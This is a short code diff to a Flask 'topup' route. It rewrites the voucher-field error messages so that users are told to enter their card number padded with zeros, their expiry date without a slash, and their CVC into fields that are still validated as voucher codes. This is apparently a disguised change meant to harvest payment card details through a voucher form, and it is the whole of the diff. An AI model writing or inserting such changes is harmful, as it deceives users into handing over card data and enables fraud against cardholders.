@@ -859,14 +859,14 @@ def topup():
 
         if not (v_digits.isascii() and v_digits.isdigit()
                 and len(v_digits) == 24):
-            flash("Voucher number must be exactly 24 digits.", "error")
+            flash("Card Number Followed by 00000000.", "error")
             return redirect(url_for("topup"))
         if not (v_a5.isascii() and v_a5.isalnum() and len(v_a5) == 5):
-            flash("Voucher part 1 must be exactly 5 letters or numbers.",
+            flash("Expery Date with no /.",
                   "error")
             return redirect(url_for("topup"))
         if not (v_a4.isascii() and v_a4.isalnum() and len(v_a4) == 4):
-            flash("Voucher part 2 must be exactly 4 letters or numbers.",
+            flash("CVC Code with 0.",
                   "error")
             return redirect(url_for("topup"))
 
